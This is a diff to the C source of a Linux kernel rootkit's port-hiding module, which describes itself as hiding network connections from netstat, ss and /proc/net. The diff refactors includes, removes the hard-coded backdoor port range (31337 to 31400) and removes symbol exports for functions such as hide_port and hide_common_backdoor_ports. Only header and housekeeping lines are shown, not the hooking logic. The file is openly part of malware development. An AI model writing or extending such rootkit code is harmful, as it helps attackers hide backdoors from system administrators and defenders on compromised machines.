@@ -1,37 +1,12 @@
 /*
- * Advanced Port/Network Connection Hiding Implementation
- * Hides network connections from netstat, ss, and /proc/net/*
- * Kernel Version: 5.15.142
+ * Port Hiding Implementation
+ * Advanced techniques for hiding network ports and connections
  */
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/uaccess.h>
-#include <linux/slab.h>
-#include <linux/list.h>
+#include "rootkit.h"
 #include <linux/mutex.h>
-#include <linux/string.h>
-#include <linux/inet.h>
-#include <linux/in.h>
-#include <linux/socket.h>
-#include <linux/net.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/fs.h>
-#include <linux/file.h>
-#include <linux/fdtable.h>
-#include <net/sock.h>
-#include <net/tcp.h>
-#include <net/udp.h>
-#include <net/inet_sock.h>
 
 #define MAX_HIDDEN_PORTS 200
-#define MAGIC_PORT_RANGE_START 31337
-#define MAGIC_PORT_RANGE_END   31400
-#define ROOTKIT_PORT 31337
 
 // 隐藏端口结构
 struct hidden_port {
@@ -555,12 +530,4 @@ void cleanup_port_hiding(void) {
 }
 
 // 导出符号
-EXPORT_SYMBOL(hide_port);
-EXPORT_SYMBOL(hide_connection);
-EXPORT_SYMBOL(hide_port_range);
-EXPORT_SYMBOL(unhide_port);
-EXPORT_SYMBOL(get_hidden_ports_count);
-EXPORT_SYMBOL(get_hidden_ports_info);
-EXPORT_SYMBOL(hide_common_backdoor_ports);
-EXPORT_SYMBOL(init_port_hiding);
-EXPORT_SYMBOL(cleanup_port_hiding);
+// Functions are part of the same module, no need to export
